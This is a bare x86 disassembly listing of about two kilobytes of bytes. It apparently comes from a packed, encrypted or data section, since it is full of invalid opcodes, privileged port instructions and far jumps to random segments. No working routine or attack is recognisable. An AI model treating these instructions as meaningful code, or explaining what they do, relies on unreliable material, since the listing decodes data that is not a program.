  4333db:	add    BYTE PTR [ecx],dl
  4333dd:	inc    edx
  4333de:	xchg   edx,eax
  4333df:	mov    bh,0x7d
  4333e1:	fsubr  DWORD PTR [esi]
  4333e3:	mov    ah,0x6a
  4333e5:	loop   0x4333c3
  4333e7:	adc    esi,DWORD PTR [edx+0x37]
  4333ea:	cmp    cl,BYTE PTR [ebx-0x5565fd5f]
  4333f0:	aaa    
  4333f1:	jns    0x43337d
  4333f3:	mov    al,0xb4
  4333f5:	jno    0x4333d8
  4333f7:	mov    esi,0x814b259a
  4333fc:	mov    WORD PTR [eax],cs
  4333fe:	shr    BYTE PTR [ebx-0x76ab2755],cl
  433404:	cli    
  433405:	push   es
  433406:	fimul  WORD PTR [esi]
  433408:	jl     0x433412
  43340a:	ss push esp
  43340c:	jno    0x43343b
  43340e:	rcr    dh,0x42
  433411:	fdiv   DWORD PTR [esi-0x19952493]
  433417:	ror    DWORD PTR [esi+0x592bd1bf],1
  43341d:	or     BYTE PTR [edi-0x30],al
  433420:	(bad)  
  433422:	pop    edx
  433423:	fmul   DWORD PTR [ebx]
  433425:	and    BYTE PTR [ecx-0x19],bh
  433428:	jmp    0x4333ad
  43342a:	adc    BYTE PTR [eax+0x5da88b76],bh
  433430:	adc    BYTE PTR [edx+0x58],bh
  433433:	loop   0x433429
  433435:	mov    bl,BYTE PTR ds:0x34c8b001
  43343b:	cmp    BYTE PTR es:[edi],ah
  43343e:	sbb    BYTE PTR [ebp+0x54],0x6c
  433442:	push   ebp
  433443:	or     bl,dh
  433445:	jmp    0x4333e7
  433447:	cmp    eax,0x89b550d4
  43344c:	xor    ch,BYTE PTR [esi-0x291453a6]
  433452:	adc    eax,0xa58602c0
  433457:	(bad)  
  433458:	int3   
  433459:	mov    ecx,0xea88eb6d
  43345e:	push   esi
  43345f:	sbb    bh,BYTE PTR [eax+0x55]
  433462:	(bad)  
  433463:	rcl    BYTE PTR [ebx+0x60],1
  433466:	add    eax,DWORD PTR [ebx+ebx*8]
  433469:	pop    ecx
  43346a:	add    DWORD PTR [eax-0x2bf89763],ebx
  433470:	pop    ebx
  433471:	add    edx,ebp
  433473:	xchg   BYTE PTR [ebp-0x71],cl
  433476:	data16 jecxz 0x4333fc
  433479:	fldcw  WORD PTR es:[esi-0x4c]
  43347d:	or     ebx,DWORD PTR [ebx]
  43347f:	push   edi
  433480:	cmc    
  433481:	or     ch,BYTE PTR [esp+eiz*2]
  433484:	das    
  433485:	sbb    eax,DWORD PTR [esi+0x3b1adc05]
  43348b:	add    al,BYTE PTR [ebx+0x47a83f50]
  433491:	pop    edi
  433492:	cmp    esi,DWORD PTR [eax-0x75]
  433495:	retf   0x3600
  433498:	gs das 
  43349a:	ret    0x6e05
  43349d:	je     0x4334a3
  43349f:	cli    
  4334a0:	cmp    eax,DWORD PTR [esp+ebx*4-0x75d2de92]
  4334a7:	push   es
  4334a8:	xchg   ebp,eax
  4334a9:	fs and eax,0x26b680d0
  4334af:	adc    BYTE PTR [edx+0x7d],0x9f
  4334b3:	fwait
  4334b4:	pop    edx
  4334b5:	mov    al,ds:0x71581edd
  4334ba:	fsubr  st,st(5)
  4334bc:	push   edx
  4334bd:	imul   esi,DWORD PTR [edx+eiz*1],0xffffffa1
  4334c1:	push   edx
  4334c2:	mov    ebx,0x8b3e8a50
  4334c7:	pusha  
  4334c8:	not    DWORD PTR [ecx+edi*4]
  4334cb:	rol    dl,0x46
  4334ce:	jecxz  0x433476
  4334d0:	mov    dh,0xab
  4334d2:	aad    0xbc
  4334d4:	xor    esi,esi
  4334d6:	mov    dh,0xb
  4334d8:	pusha  
  4334d9:	mov    ebx,0x23c37a36
  4334de:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4334df:	jo     0x4334f5
  4334e1:	mov    esi,0xc0036d68
  4334e6:	test   DWORD PTR [ebx+0x27],esi
  4334e9:	mov    al,0x1f
  4334eb:	clc    
  4334ec:	(bad)  
  4334ed:	lds    ecx,FWORD PTR [edx]
  4334ef:	cs mov ch,0xb
  4334f2:	push   ebp
  4334f3:	jno    0x4334dd
  4334f5:	mov    DWORD PTR [eax],ecx
  4334f7:	in     al,0xf2
  4334f9:	pop    ebx
  4334fa:	pop    ss
  4334fb:	mov    cl,0x9
  4334fd:	xchg   BYTE PTR [edx+0x111e13fe],bh
  433503:	test   al,0xdb
  433505:	jp     0x4334e9
  433507:	inc    edx
  433508:	fwait
  433509:	stc    
  43350a:	or     al,0xa0
  43350c:	jge    0x433566
  43350e:	jns    0x433493
  433510:	stos   BYTE PTR es:[edi],al
  433511:	push   0x11f56db7
  433516:	les    ebx,FWORD PTR [eax+0x2e1a088e]
  43351c:	xchg   ebp,eax
  43351d:	or     al,bh
  43351f:	repz sub BYTE PTR [ecx-0x35],bl
  433523:	ret    0x82ba
  433526:	ss call 0xb775:0x98f6500
  43352e:	(bad)  
  43352f:	push   es
  433530:	xchg   ebp,eax
  433531:	mov    edi,0xbf13884c
  433536:	pop    ecx
  433537:	enter  0x23b,0x6e
  43353b:	retf   
  43353c:	add    BYTE PTR [edx-0x657452e7],al
  433542:	and    bl,BYTE PTR es:[eax+edx*8]
  433546:	push   ss
  433547:	outs   dx,DWORD PTR cs:[esi]
  433549:	xchg   edx,eax
  43354a:	aad    0x0
  43354c:	aaa    
  43354d:	aaa    
  43354e:	ja     0x43352f
  433550:	ds inc esp
  433552:	mov    edx,0xb5bb6088
  433557:	jmp    0x839:0x36cd1a17
  43355e:	sbb    bl,al
  433560:	xchg   esi,eax
  433561:	es sub eax,0xe80cfbd7
  433567:	aam    0x8d
  433569:	lods   eax,DWORD PTR ds:[esi]
  43356a:	stos   DWORD PTR es:[edi],eax
  43356b:	clc    
  43356c:	mov    bl,0xce
  43356e:	xchg   ebx,eax
  43356f:	leave  
  433570:	(bad)  
  433571:	cmp    eax,0xbcb4b5b8
  433576:	lock inc BYTE PTR [eax]
  433579:	mov    ds:0xb2d1f2c6,al
  43357e:	aam    0x41
  433580:	je     0x433505
  433582:	push   cs
  433583:	and    BYTE PTR [esp+ebx*4],al
  433586:	mov    eax,ds:0xba00694a
  43358b:	aad    0x51
  43358d:	les    ebx,FWORD PTR [edx-0x6]
  433590:	xchg   DWORD PTR [esi-0x44eeecbe],esp
  433596:	jno    0x433529
  433598:	jb     0x433563
  43359a:	pushf  
  43359b:	xchg   edi,eax
  43359c:	inc    ebx
  43359d:	rol    BYTE PTR [esi-0x40],1
  4335a0:	cdq    
  4335a1:	pop    ss
  4335a2:	daa    
  4335a3:	in     eax,0xbb
  4335a5:	mov    al,0xb5
  4335a7:	pop    ebx
  4335a8:	xor    al,0x47
  4335aa:	xchg   ecx,eax
  4335ab:	shl    BYTE PTR [eax],0xd4
  4335ae:	cmc    
  4335af:	adc    ah,bh
  4335b1:	arpl   WORD PTR [eax+ebp*2-0x7e],si
  4335b5:	loop   0x433609
  4335b7:	jno    0x4335b8
  4335b9:	jb     0x43356a
  4335bb:	lods   eax,DWORD PTR ds:[esi]
  4335bc:	inc    esp
  4335bd:	or     ebp,DWORD PTR [edx-0x689e4aa3]
  4335c3:	imul   ecx,DWORD PTR [ecx+0x71],0x61
  4335c7:	fisttp DWORD PTR [edx]
  4335c9:	(bad)  
  4335ca:	fisubr DWORD PTR [ebx+0x41]
  4335cd:	add    eax,0xea0d91c
  4335d2:	mov    BYTE PTR [ebp+0x14],cl
  4335d5:	(bad)  
  4335d6:	loop   0x4335b3
  4335d8:	into   
  4335d9:	repnz sbb ecx,DWORD PTR [ebp+0x4bd887a0]
  4335e0:	enter  0xf,0x9b
  4335e4:	mov    dl,0x62
  4335e6:	push   edi
  4335e7:	push   ebp
  4335e8:	mov    bh,0x29
  4335ea:	dec    edx
  4335eb:	std    
  4335ec:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4335ed:	(bad)  
  4335ee:	in     al,0x43
  4335f0:	adc    al,0xbb
  4335f2:	add    dh,BYTE PTR [eax-0x2a229569]
  4335f8:	mov    dh,0x2b
  4335fa:	push   0xcafd5ef1
  4335ff:	inc    edx
  433600:	and    BYTE PTR [esi+0xb],dl
  433603:	adc    DWORD PTR [ebp+0x53],ebp
  433606:	add    ch,BYTE PTR [edx]
  433608:	adc    dl,BYTE PTR [eax+0x4a]
  43360b:	add    eax,0x4476a8ec
  433610:	out    0xd5,eax
  433612:	jl     0x4335b4
  433614:	jb     0x4335e8
  433616:	mov    ebx,0x4c5176a2
  43361b:	adc    dh,BYTE PTR [ebp-0x25]
  43361e:	xchg   esp,eax
  43361f:	inc    ebx
  433620:	sub    BYTE PTR [edi+0x62236a65],bh
  433626:	adc    BYTE PTR [ebp-0x32],0x0
  43362a:	add    dh,bl
  43362c:	pop    ebx
  43362d:	pop    ss
  43362e:	add    al,0xdc
  433630:	inc    edx
  433631:	jl     0x433691
  433633:	out    0xdc,eax
  433635:	(bad)  
  433636:	in     al,dx
  433637:	mov    ah,0x21
  433639:	and    BYTE PTR [esi+0x47be1a38],dh
  43363f:	pop    esp
  433640:	add    al,0x21
  433642:	and    dh,BYTE PTR [esi]
  433644:	adc    DWORD PTR [edi-0x70],esp
  433647:	push   0xb61637c7
  43364c:	lods   eax,DWORD PTR ds:[esi]
  43364d:	xor    BYTE PTR [ebx],bh
  43364f:	sub    DWORD PTR es:[ecx*1+0x39dbfc13],0xffffffd0
  433658:	add    al,0x37
  43365a:	sbb    al,BYTE PTR [ebp+0x21]
  43365d:	add    edx,DWORD PTR [ebx-0x3e]
  433660:	push   esi
  433661:	push   eax
  433662:	mov    cl,0x29
  433664:	mov    edx,0x2801a8b
  433669:	jno    0x4336b4
  43366b:	adc    eax,0xf21d8219
  433670:	pusha  
  433671:	(bad)  
  433672:	aam    0x45
  433674:	fcmovnbe st,st(6)
  433676:	imul   eax,DWORD PTR cs:[edi],0x5fd1082a
  43367d:	pop    ecx
  43367e:	sub    eax,DWORD PTR [edi+0x54]
  433681:	ins    BYTE PTR es:[edi],dx
  433682:	pop    ebx
  433683:	aam    0xd5
  433685:	inc    esp
  433686:	dec    ebx
  433687:	retf   0x6dba
  43368a:	test   DWORD PTR [ebp+0x68],ebp
  43368d:	enter  0xa420,0x31
  433691:	pop    ecx
  433692:	mov    esi,0x6120f3da
  433697:	fstp   TBYTE PTR [edx]
  433699:	sbb    BYTE PTR ds:0x6e7ae984,0x11
  4336a0:	scas   eax,DWORD PTR es:[edi]
  4336a1:	mov    ds:0xe3744762,al
  4336a6:	imul   edi,DWORD PTR fs:[ebp+ebx*8+0x68db7150],0x9936315f
  4336b2:	pop    ecx
  4336b3:	xor    dh,BYTE PTR [edx+0x360883ad]
  4336b9:	xor    al,0x81
  4336bb:	dec    edx
  4336bc:	das    
  4336bd:	call   0xc8c0:0x5d0043d1
  4336c4:	inc    edx
  4336c5:	test   al,0x2b
  4336c7:	jge    0x433674
  4336c9:	inc    ebp
  4336ca:	fcmovnb st,st(6)
  4336cc:	lds    ebp,FWORD PTR [edi+0x5a]
  4336cf:	pop    edi
  4336d0:	nop
  4336d1:	jno    0x4336d7
  4336d3:	fsubr  DWORD PTR [esi-0x73]
  4336d6:	pusha  
  4336d7:	fcomp  DWORD PTR [ecx]
  4336d9:	jecxz  0x43366d
  4336db:	inc    eax
  4336dc:	pop    esp
  4336dd:	adc    DWORD PTR [ebp+0x11],ecx
  4336e0:	sbb    ecx,DWORD PTR [edx]
  4336e2:	jle    0x4336f7
  4336e4:	jmp    0xa1b47e1c
  4336e9:	or     esp,DWORD PTR [eax-0x6e2a919f]
  4336ef:	sar    DWORD PTR [ebp+0x54d6d2e0],0x28
  4336f6:	loopne 0x43369c
  4336f8:	sbb    eax,0xa9eccc62
  4336fd:	pop    ebp
  4336fe:	push   0xeb849e8a
  433703:	mov    BYTE PTR [ecx+0x38],dh
  433706:	mov    WORD PTR [ebx],ss
  433708:	mov    bh,0x8d
  43370a:	ins    DWORD PTR es:[edi],dx
  43370b:	sbb    edx,DWORD PTR [ebx-0x2f]
  43370e:	test   al,0xf4
  433710:	repnz add DWORD PTR [ecx-0x69],edi
  433714:	sub    DWORD PTR [ebp-0x27b41557],0xa9058071
  43371e:	in     eax,dx
  43371f:	push   ebp
  433720:	jne    0x43378b
  433722:	imul   esi,DWORD PTR [ebx],0xdf746702
  433728:	sti    
  433729:	sub    ebp,DWORD PTR [edx+ebp*4-0x28]
  43372d:	std    
  43372e:	xor    al,0x88
  433730:	div    DWORD PTR [edi]
  433732:	sbb    BYTE PTR [esi+0x8],0x42
  433736:	sub    esi,DWORD PTR [edx+eiz*2+0x7f373601]
  43373d:	ins    DWORD PTR es:[edi],dx
  43373e:	mov    ds:0xbabad1b,al
  433743:	pop    edi
  433744:	ret    0x5878
  433747:	or     DWORD PTR [ecx-0x25],esi
  43374a:	ss call 0x31e9:0xab665598
  433752:	fnsave [esp+eax*1+0x51db42ed]
  433759:	cmp    BYTE PTR [ebx-0x4d41fa03],ah
  43375f:	imul   esp,eax,0x515a1740
  433765:	ins    BYTE PTR es:[edi],dx
  433766:	mul    DWORD PTR [edi+0x6afb7661]
  43376c:	add    edi,DWORD PTR [edx-0x6c]
  43376f:	ds out 0xb4,al
  433772:	mov    ecx,0xdbef68e8
  433777:	ret    0x8386
  43377a:	sti    
  43377b:	inc    edx
  43377c:	rcl    dh,0xbd
  43377f:	xor    al,0xb1
  433782:	test   eax,0xa27d4b82
  433787:	mov    al,ds:0xc20c072a
  43378c:	mov    dh,0x21
  43378e:	ds cmp bl,bl
  433791:	(bad)  
  433792:	fist   DWORD PTR [eax+0x55]
  433795:	push   0x5bb66dea
  43379a:	push   edi
  43379b:	rcr    edx,0xd6
  43379e:	jg     0x433786
  4337a0:	mov    bh,0x7
  4337a2:	and    BYTE PTR [eax],bh
  4337a4:	mov    ah,0x65
  4337a6:	imul   ebx,ebx,0x2838abce
  4337ac:	adc    DWORD PTR [ebp-0x3c],ebx
  4337af:	xor    bl,BYTE PTR [ebx]
  4337b1:	mov    ch,0x6d
  4337b3:	sub    eax,0x233ae982
  4337b8:	push   esi
  4337b9:	rcl    DWORD PTR [edi-0x29],1
  4337bc:	or     ch,BYTE PTR [esi+0xd]
  4337bf:	add    al,0x3b
  4337c1:	test   BYTE PTR [ebp-0x5f],cl
  4337c4:	popf   
  4337c5:	pusha  
  4337c6:	sub    DWORD PTR [eax-0x2d71057d],0x1b0151eb
  4337d0:	sub    dh,BYTE PTR [ecx-0x2fea4582]
  4337d6:	rcl    dh,0x1a
  4337d9:	lock sti 
  4337db:	jg     0x433849
  4337dd:	dec    edi
  4337de:	(bad)  
  4337df:	call   0x976ae6e
  4337e4:	mov    ds:0xabb9a93d,al
  4337e9:	fisubr DWORD PTR [esi+0xb]
  4337ec:	ins    DWORD PTR es:[edi],dx
  4337ed:	dec    ebp
  4337ee:	imul   edi,DWORD PTR [edi+0x3d],0xffffffa7
  4337f2:	push   esi
  4337f3:	lods   eax,DWORD PTR ds:[esi]
  4337f4:	pop    ebp
  4337f5:	adc    BYTE PTR [eax-0x5f],dh
  4337f8:	mov    eax,ds:0x69c856fa
  4337fd:	add    ch,BYTE PTR [esp+edx*1]
  433800:	sub    BYTE PTR [esi+0x41],0x92
  433804:	je     0x43381f
  433806:	mov    esi,0x5176288b
  43380b:	mov    al,0x8
  43380d:	pop    ebp
  43380e:	outs   dx,BYTE PTR ds:[esi]
  43380f:	ja     0x433846
  433811:	push   eax
  433812:	les    eax,FWORD PTR [esi+0x4b9aa7aa]
  433818:	popf   
  433819:	call   0x1afe98a8
  43381e:	shr    BYTE PTR [esi+eiz*1-0xe],0x6d
  433823:	xor    al,0x1a
  433825:	push   ebp
  433826:	or     eax,DWORD PTR ds:0xea4b8e2e
  43382c:	dec    ebx
  43382d:	ins    DWORD PTR es:[edi],dx
  43382e:	sbb    edx,0xffffffe3
  433831:	adc    cl,BYTE PTR [esi]
  433833:	hlt    
  433834:	xor    eax,0x76a83762
  433839:	cmp    DWORD PTR [edx-0x7920fea8],eax
  43383f:	ret    0x500d
  433842:	fcomp  QWORD PTR [edx]
  433844:	xlat   BYTE PTR ds:[ebx]
  433845:	mov    edi,0x901d1f5f
  43384a:	das    
  43384b:	sbb    eax,0x2e81f6d4
  433850:	rcl    BYTE PTR [ecx],0x91
  433853:	sbb    ah,BYTE PTR [edi-0x5ff9f2ad]
  433859:	or     esp,DWORD PTR [ebp-0x4198102f]
  43385f:	adc    al,0x2
  433861:	xor    al,0x51
  433863:	rol    BYTE PTR [ebp+0x62735524],0x77
  43386a:	inc    edi
  43386b:	test   DWORD PTR [ebp-0x55a5af53],eax
  433871:	pop    edx
  433872:	pop    esp
  433873:	pop    ecx
  433874:	and    al,BYTE PTR [edx+0x57]
  433877:	les    ecx,FWORD PTR [ebp-0x3ac072af]
  43387d:	xchg   edx,eax
  43387e:	add    al,0xf4
  433880:	mov    edx,0x5fdb0bb5
  433885:	retf   
  433886:	pop    ecx
  433887:	fld    DWORD PTR [edx+0x6a]
  43388a:	and    BYTE PTR [edx+0x49],cl
  43388d:	fstp   st(4)
  43388f:	fidivr DWORD PTR [edx]
  433891:	mov    al,ds:0xd3f23d13
  433896:	inc    ebx
  433897:	and    BYTE PTR [eax+ebp*4-0x46],dl
  43389b:	aam    0x45
  43389d:	pop    eax
  43389e:	mov    al,ds:0xd69cd914
  4338a3:	lods   eax,DWORD PTR ds:[esi]
  4338a4:	fstp   QWORD PTR [edx+0x1e41eadf]
  4338aa:	sbb    edx,DWORD PTR [edi]
  4338ac:	ret    0x9397
  4338af:	xchg   esp,eax
  4338b0:	pop    ss
  4338b1:	sub    BYTE PTR [ebp+eax*8-0x3b],bl
  4338b5:	lahf   
  4338b6:	mov    bl,bl
  4338b8:	cld    
  4338b9:	add    DWORD PTR [eax],ecx
  4338bb:	jbe    0x4338d1
  4338bd:	xchg   ebp,eax
  4338be:	in     eax,0x6
  4338c0:	je     0x43391d
  4338c2:	fcomp  st(2)
  4338c4:	mov    dh,0xe2
  4338c6:	inc    ecx
  4338c7:	(bad)  
  4338c8:	sbb    al,0x1d
  4338ca:	push   eax
  4338cb:	push   edx
  4338cc:	pop    eax
  4338cd:	in     eax,dx
  4338ce:	loopne 0x433905
  4338d0:	adc    BYTE PTR [eax+0x63],dh
  4338d3:	jmp    0x43394d
  4338d5:	fsub   st,st(5)
  4338d7:	pop    ds
  4338d8:	push   ss
  4338d9:	aad    0xad
  4338db:	mov    al,0x0
  4338dd:	pop    ecx
  4338de:	stc    
  4338df:	or     eax,0x1a532486
  4338e4:	mov    ds:0xa14d5362,al
  4338e9:	arpl   WORD PTR [ebx+0x5752da2e],ax
  4338ef:	xchg   bl,ah
  4338f1:	mov    ecx,0xa74ba1b1
  4338f6:	fcom   DWORD PTR [eax-0x23]
  4338f9:	fmul   st,st(0)
  4338fb:	lds    ecx,FWORD PTR [ecx]
  4338fd:	les    ecx,FWORD PTR [ebx-0x4e43f211]
  433903:	(bad)  [edx-0x60]
  433906:	les    ebx,FWORD PTR [edi]
  433908:	popf   
  433909:	pusha  
  43390a:	out    0x1a,eax
  43390c:	ret    
  43390d:	aad    0x86
  43390f:	fcom   DWORD PTR [ecx+0x5]
  433912:	gs jnp 0x43393c
  433915:	dec    esp
  433916:	sbb    esi,DWORD PTR [esi+0x68f82826]
  43391c:	leave  
  43391d:	sbb    dh,ah
  43391f:	push   ebx
  433920:	add    eax,0xda975108
  433925:	mov    dh,0x64
  433927:	outs   dx,BYTE PTR ds:[esi]
  433928:	lods   eax,DWORD PTR ds:[esi]
  433929:	popf   
  43392a:	(bad)  
  43392b:	xchg   esi,eax
  43392c:	aaa    
  43392d:	outs   dx,BYTE PTR ds:[esi]
  43392e:	ins    DWORD PTR es:[edi],dx
  43392f:	ins    DWORD PTR es:[edi],dx
  433930:	inc    edi
  433931:	add    BYTE PTR [edi-0x70],0xbf
  433935:	push   ebx
  433936:	sub    bh,BYTE PTR [ebx+0x5b6e0d67]
  43393c:	mov    ecx,0xe2106a50
  433941:	jmp    0x51260476
  433946:	mov    ds:0xa9a1852e,al
  43394b:	jl     0x43396d
  43394d:	sbb    DWORD PTR [edx+0x5b],esp
  433950:	push   0xbab72a1b
  433955:	imul   esi,DWORD PTR [ecx],0x74
  433958:	push   eax
  433959:	mov    ebx,0x295ba0a9
  43395e:	out    0x68,eax
  433960:	je     0x4339bb
  433962:	rcr    dl,cl
  433964:	lea    ebp,[ebp-0x5d]
  433967:	push   cs
  433968:	sub    bl,BYTE PTR [ebx+esi*4]
  43396b:	sub    DWORD PTR [ecx+0x2e4443da],eax
  433971:	test   al,0x5f
  433973:	fst    QWORD PTR [eax+0x67]
  433976:	mov    bl,0xf8
  433978:	push   0xffffffa2
  43397a:	cli    
  43397b:	or     BYTE PTR [esi],dh
  43397d:	adc    DWORD PTR [edi+0x2d568635],esi
  433983:	ror    edi,1
  433985:	out    0xd8,eax
  433987:	mov    dh,0xad
  433989:	stos   DWORD PTR es:[edi],eax
  43398a:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  43398b:	jbe    0x4339c5
  43398d:	mov    ebp,DWORD PTR [ecx+ebp*8]
  433990:	dec    ebp
  433991:	add    DWORD PTR [ebp+0x15],esi
  433994:	pop    esp
  433995:	fdivr  DWORD PTR [esi+0x31]
  433998:	popf   
  433999:	repnz leave 
  43399b:	hlt    
  43399c:	or     al,0x4f
  43399e:	aas    
  43399f:	mov    eax,0x71b802b4
  4339a4:	and    ch,BYTE PTR [ecx-0x4aad389]
  4339aa:	pop    ss
  4339ab:	loopne 0x433983
  4339ad:	mov    dh,0xb
  4339af:	jl     0x433a26
  4339b1:	(bad)  
  4339b2:	rcl    DWORD PTR [ecx+0x39c6b014],1
  4339b8:	ins    DWORD PTR es:[edi],dx
  4339b9:	imul   ebx,DWORD PTR [eax+0x538bff8a],0xffffffe9
  4339c0:	push   cs
  4339c1:	sub    BYTE PTR [eax-0x6f0e493],bh
  4339c7:	xor    eax,0xe8286218
  4339cc:	(bad)  
  4339cd:	mov    al,bl
  4339cf:	sbb    ch,BYTE PTR [edi-0x41]
  4339d2:	sti    
  4339d3:	data16 mov dl,0x59
  4339d6:	fstp   QWORD PTR [eax-0x8]
  4339d9:	jmp    0xad19:0x4e9e5382
  4339e0:	pusha  
  4339e1:	out    dx,eax
  4339e2:	in     al,dx
  4339e3:	stos   BYTE PTR es:[edi],al
  4339e4:	pusha  
  4339e5:	add    edx,DWORD PTR [eax]
  4339e7:	xor    esp,DWORD PTR [edi-0x13]
  4339ea:	or     al,bl
  4339ec:	add    esp,ebp
  4339ee:	sbb    eax,0xecc89abf
  4339f3:	jmp    0x4339ad
  4339f5:	xor    eax,0x9e4cbaa8
  4339fa:	test   DWORD PTR [ecx-0x23491d17],ecx
  433a00:	test   al,0x9
  433a02:	mul    DWORD PTR [ebp+0x3f25716a]
  433a08:	add    eax,0xb7055d0b
  433a0d:	mov    dh,0x3d
  433a0f:	pop    ss
  433a10:	dec    ecx
  433a11:	fdiv   DWORD PTR [esi-0x54]
  433a14:	ss inc ebp
  433a16:	jne    0x4339cd
  433a18:	inc    ecx
  433a19:	fwait
  433a1a:	and    ah,BYTE PTR [esi+ebx*2]
  433a1d:	or     eax,0xaed443f9
  433a22:	sub    dh,al
  433a24:	xchg   ebx,eax
  433a25:	pop    edx
  433a26:	test   BYTE PTR [edx],cl
  433a28:	rol    dh,0x46
  433a2b:	ds scas al,BYTE PTR es:[edi]
  433a2d:	fstp   QWORD PTR [ebx]
  433a2f:	neg    BYTE PTR [ecx+0x16d8a35b]
  433a35:	and    ah,BYTE PTR [edx+0x59]
  433a38:	add    eax,0x86624a44
  433a3d:	sbb    al,0xb6
  433a40:	mov    al,ds:0xa2687759
  433a45:	inc    ebp
  433a46:	pop    ebp
  433a47:	inc    ebp
  433a48:	sbb    esi,DWORD PTR [edi+0x25762cb]
  433a4e:	aas    
  433a4f:	ins    BYTE PTR es:[edi],dx
  433a50:	cmp    BYTE PTR [eax],bl
  433a52:	mov    dh,0xad
  433a54:	add    ecx,DWORD PTR [eax+0x2feabe0]
  433a5a:	mov    ecx,0xea239dc2
  433a5f:	test   al,0xe
  433a61:	enter  0x6390,0xf0
  433a65:	pushf  
  433a66:	sbb    BYTE PTR [edx],0x8a
  433a69:	pop    ebx
  433a6a:	xor    eax,0xc6ab165b
  433a6f:	loop   0x433ab3
  433a71:	mov    ebx,0x364aac35
  433a76:	push   eax
  433a77:	sbb    bh,ch
  433a79:	rcl    BYTE PTR [ebp-0x50],cl
  433a7c:	fucomp st(2)
  433a7e:	mov    al,ds:0xbb2543ed
  433a83:	xchg   edx,eax
  433a84:	push   esi
  433a85:	nop
  433a86:	mov    dh,0x6e
  433a88:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  433a89:	or     eax,0x2c4d1364
  433a8e:	and    ebp,DWORD PTR [eax+edi*2]
  433a91:	dec    ecx
  433a92:	repnz push 0x4daaaedb
  433a98:	leave  
  433a99:	or     esi,DWORD PTR [edi-0x3e]
  433a9c:	loopne 0x433a79
  433a9e:	mov    edx,0x1daee888
  433aa3:	ja     0x433a31
  433aa5:	mov    eax,ds:0xd50dc22b
  433aaa:	ins    DWORD PTR es:[edi],dx
  433aab:	popa   
  433aac:	jl     0x433a69
  433aae:	je     0x433b0f
  433ab0:	cmc    
  433ab1:	repnz enter 0x558b,0xb0
  433ab6:	and    ebp,DWORD PTR [esi+0x20]
  433ab9:	mov    cl,cl
  433abb:	push   esi
  433abc:	push   ebx
  433abd:	or     eax,0x7688edb0
  433ac2:	push   eax
  433ac3:	pop    esi
  433ac4:	pop    ss
  433ac5:	rcr    cl,0x4e
  433ac8:	push   ebx
  433ac9:	jg     0x433aab
  433acb:	ja     0x433b36
  433acd:	imul   esi,DWORD PTR [eax-0x127c994a],0x43
  433ad4:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  433ad5:	cs pop eax
  433ad7:	inc    eax
  433ad8:	fucomp st(0)
  433ada:	sbb    ch,0x99
  433add:	xor    BYTE PTR [edx+esi*2+0xd10a15a],ah
  433ae4:	int3   
  433ae5:	inc    esi
  433ae6:	iret   
  433ae7:	push   ebp
  433ae8:	dec    ecx
  433ae9:	ins    DWORD PTR es:[edi],dx
  433aea:	jmp    0x433b16
  433aec:	mov    dh,0x19
  433aee:	sar    BYTE PTR [esp+ecx*8],cl
  433af1:	xor    eax,0x70100cd3
  433af6:	fcmovnu st,st(2)
  433af8:	inc    ecx
  433af9:	neg    BYTE PTR [esi-0x2f07dffb]
  433aff:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  433b00:	mov    BYTE PTR [esi+0x5c883600],ah
  433b06:	outs   dx,BYTE PTR ds:[esi]
  433b07:	ss js  0x433b38
  433b0a:	mov    ch,BYTE PTR [esi-0x7b]
  433b0d:	push   cs
  433b0e:	pop    ecx
  433b0f:	inc    ecx
  433b10:	dec    ebx
  433b11:	out    0x6,al
  433b13:	push   ebp
  433b14:	pop    ss
  433b15:	les    esi,FWORD PTR ds:0x9a38e178
  433b1b:	mov    ch,0x9
  433b1d:	clc    
  433b1e:	aad    0xe6
  433b20:	retf   
  433b21:	push   ebp
  433b22:	hlt    
  433b23:	sub    cl,cl
  433b25:	cmp    al,0x15
  433b27:	pop    ss
  433b28:	mov    dh,0xad
  433b2a:	mov    eax,0x6cfe2fcb
  433b2f:	or     ah,BYTE PTR [edi]
  433b31:	frstor [ecx+0x5e303b6d]
  433b37:	sbb    eax,0xd7147006
  433b3c:	jmp    0x76c8c84b
  433b41:	arpl   WORD PTR ds:0x54c9a24,dx
  433b47:	fld1   
  433b49:	ins    BYTE PTR es:[edi],dx
  433b4a:	adc    al,0x28
  433b4c:	sbb    dh,BYTE PTR [edi+0x66250e0a]
  433b52:	adc    al,bh
  433b54:	or     ch,BYTE PTR [esi]
  433b56:	sub    al,0x6c
  433b58:	call   FWORD PTR [edx+0x3d]
  433b5b:	dec    ebp
  433b5c:	push   edx
  433b5d:	adc    al,0x12
  433b5f:	adc    ebx,ebx
  433b61:	lods   eax,DWORD PTR ds:[esi]
  433b62:	and    ebx,esi
  433b64:	push   edi
  433b65:	push   esi
  433b66:	xchg   ebp,eax
  433b67:	pop    ecx
  433b68:	jp     0x433be8
  433b6a:	push   ss
  433b6b:	or     al,0x6d
  433b6d:	pop    ebp
  433b6e:	sbb    eax,0xbf86fb45
  433b73:	call   0x80db:0x7410daf4
  433b7a:	call   0xebeff608
  433b7f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  433b80:	cdq    
  433b81:	in     eax,dx
  433b82:	mov    dh,0xb0
  433b84:	push   ebp
  433b85:	and    edi,DWORD PTR [eax+0xbb32219]
  433b8b:	dec    ebx
  433b8c:	adc    DWORD PTR [ecx-0x7df6523c],ecx
  433b92:	sub    DWORD PTR [ecx-0x234ee75],esi
  433b98:	mov    dh,0x23
  433b9a:	jbe    0x433bed
  433b9c:	jle    0x433bd7
  433b9e:	scas   al,BYTE PTR es:[edi]
  433b9f:	mov    dh,0x8b
  433ba1:	repnz and BYTE PTR [eax+0x5b],dh
  433ba5:	push   0xfb7d73db
  433baa:	repnz sub BYTE PTR [edx+0x6d95207d],ah
  433bb1:	add    eax,esp
  433bb3:	lods   eax,DWORD PTR ds:[esi]
  433bb4:	sub    edx,DWORD PTR [esp+ecx*4]
  433bb7:	xor    al,0x60
  433bb9:	pop    ebp
  433bba:	adc    al,0xef
  433bbc:	jbe    0x433c19
  433bbe:	push   0x41
  433bc0:	and    ecx,DWORD PTR [edi+ebp*8-0x2e03c75c]
  433bc7:	dec    ebx
  433bc8:	aaa    
  433bc9:	fisubr DWORD PTR [ebp-0x5252c845]
  433bcf:	(bad)  [ecx+0x44]
  433bd2:	push   esi
